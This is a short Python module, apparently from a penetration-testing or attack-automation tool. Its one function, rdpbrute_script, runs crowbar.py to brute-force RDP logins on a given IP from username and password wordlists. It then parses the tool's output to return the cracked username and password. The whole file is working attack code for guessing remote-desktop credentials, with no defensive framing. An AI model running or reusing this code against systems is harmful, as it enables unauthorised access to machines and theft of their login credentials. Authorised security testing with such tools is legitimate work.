import os
import re
import subprocess

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def rdpbrute_script(ip):
    p = subprocess.run(
        [
            "python",
            f"{BASE_DIR}/scripts/crowbar.py",
            "-q",
            "-b",
            "rdp",
            "-U",
            f"{BASE_DIR}/scripts/wordlist/username.txt",
            "-C",
            f"{BASE_DIR}/scripts/wordlist/password.txt",
            "-s",
            f"{ip}",
        ],
        capture_output=True,
        encoding="utf-8",
    )
    ansi_escape = re.compile(r"\x1b[^m]*m")
    output = ansi_escape.sub("", str(p.stderr)).split("\n")[1]
    if output:
        output = re.findall(r"[\d\.]+\:\d+\s+\-\s+\S+\:\S+", output)[0]
        target_ip, user_pass = output.split("-")
        username, password = user_pass.strip().split(":")
        result = {
            "target_ip": target_ip.strip(),
            "username": username,
            "password": password,
        }

    else:
        result = None

    return result
